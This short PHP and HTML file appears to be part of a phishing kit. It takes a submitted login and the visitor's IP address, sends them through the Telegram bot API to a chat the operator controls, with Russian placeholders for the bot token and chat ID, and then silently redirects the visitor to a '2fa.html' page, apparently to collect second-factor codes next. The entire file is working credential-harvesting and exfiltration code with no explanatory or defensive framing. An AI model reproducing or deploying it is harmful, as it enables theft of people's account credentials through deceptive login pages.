

<?php
$login = $_POST['login'];
$ip = $_SERVER['REMOTE_ADDR'];
$token = 'токен бота';
$chatid = 'юзер id';
$send = file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=Был выполнен вход!%0AЛогин: {$login}%0AIP: {$ip}");
?>


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0; url=/2fa.html" />
</head>
<body>
</body>
</html>